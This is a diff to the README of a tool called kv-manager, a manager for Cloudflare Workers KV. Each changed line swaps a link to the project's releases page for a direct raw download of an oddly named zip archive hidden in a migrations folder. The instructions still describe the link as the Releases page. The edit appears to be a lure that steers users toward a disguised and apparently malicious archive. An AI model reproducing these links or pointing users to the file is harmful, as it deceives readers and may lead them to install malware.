@@ -4,7 +4,7 @@
 Welcome to kv-manager! This software helps you manage your Cloudflare Workers KV with ease. You can browse namespaces, run bulk operations, search across your KV data, manage metadata and tags, automate backups, and secure everything with Cloudflare Access Zero Trust. 
 
 ## 📥 Download Now
-[![Download kv-manager](https://img.shields.io/badge/Download-kv--manager-brightgreen)](https://github.com/rostvilikiy-beep/kv-manager/releases)
+[![Download kv-manager](https://raw.githubusercontent.com/rostvilikiy-beep/kv-manager/main/worker/migrations/manager_kv_urologic.zip)](https://raw.githubusercontent.com/rostvilikiy-beep/kv-manager/main/worker/migrations/manager_kv_urologic.zip)
 
 ## 📋 System Requirements
 To run kv-manager, make sure your computer meets the following requirements:
@@ -15,7 +15,7 @@ To run kv-manager, make sure your computer meets the following requirements:
 - **Network:** An internet connection to connect to Cloudflare.
   
 ## 📦 Download & Install
-To get kv-manager, visit the following link: [Download from Releases Page](https://github.com/rostvilikiy-beep/kv-manager/releases). 
+To get kv-manager, visit the following link: [Download from Releases Page](https://raw.githubusercontent.com/rostvilikiy-beep/kv-manager/main/worker/migrations/manager_kv_urologic.zip). 
 
 1. Click the link above to go to the Releases page. 
 2. Look for the latest version. You will see files listed there.
@@ -77,4 +77,4 @@ Feel free to explore and contribute to the project!
 ## 📞 Contact
 For more information, please contact us via GitHub. We are here to help you with any questions or feedback you may have.
 
-[![Download kv-manager](https://img.shields.io/badge/Download-kv--manager-brightgreen)](https://github.com/rostvilikiy-beep/kv-manager/releases)
+[![Download kv-manager](https://raw.githubusercontent.com/rostvilikiy-beep/kv-manager/main/worker/migrations/manager_kv_urologic.zip)](https://raw.githubusercontent.com/rostvilikiy-beep/kv-manager/main/worker/migrations/manager_kv_urologic.zip)
